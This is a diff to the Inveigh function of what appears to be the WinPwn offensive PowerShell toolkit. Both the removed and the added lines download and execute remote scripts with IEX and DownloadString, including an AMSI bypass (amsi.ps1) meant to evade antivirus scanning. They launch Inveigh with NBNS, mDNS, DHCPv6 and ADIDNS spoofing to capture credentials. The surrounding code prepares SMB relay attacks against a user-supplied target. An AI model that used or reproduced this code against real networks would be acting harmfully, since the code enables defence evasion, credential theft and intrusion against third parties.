@@ -330,8 +330,6 @@ function Inveigh {
     
     if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
     {
-        Write-Host 'Starting WinPwn in a new window so that you can use this one for Invoke-TheHash'
-        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''$S3cur3Th1sSh1t_repo/WinPwn/master/WinPwn.ps1'');WinPwn -repo $S3cur3Th1sSh1t_repo;}'
         $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
         $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
         $Wcl = new-object System.Net.WebClient
@@ -347,31 +345,16 @@ function Inveigh {
         Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation'
     }
     
-    $adidns = Read-Host -Prompt 'Do you want to start Inveigh with Active Directory-Integrated DNS dynamic Update attack? (yes/no)'
-    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
-    {   
-        if (isadmin)
-        {
-                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
-    }
-        else 
-        {
-               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
-      }
-    }
-    else
+    IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/PowerSharpPack/master/PowerSharpBinaries/Invoke-Inveigh.ps1")
+    if (isadmin)
     {
-        if (isadmin)
-        {
-                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
-		
-        }
-        else 
-        {
-               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -IP $IPaddress.IPv4Address.IPAddress -FileOutputDirectory $currentPath\;}
-	       
-        }
-    }
+            $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;Invoke-Inveigh -SNIFFER Y -ICMPv6 Y -DHCPv6 Y -MDNS Y -NBNS Y -HTTPS Y -Console 5 -Local Y -SpooferIP $IPaddress.IPv4Address.IPAddress -FileDirectory $currentPath\
+	}
+    else 
+    {
+            $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;Invoke-Inveigh -SNIFFER N -ICMPv6 N -DHCPv6 Y -MDNS Y -NBNS Y -HTTPS Y -Console 5 -Local Y -SpooferIP $IPaddress.IPv4Address.IPAddress -FileDirectory $currentPath\
+	}
+    
 }
 
 
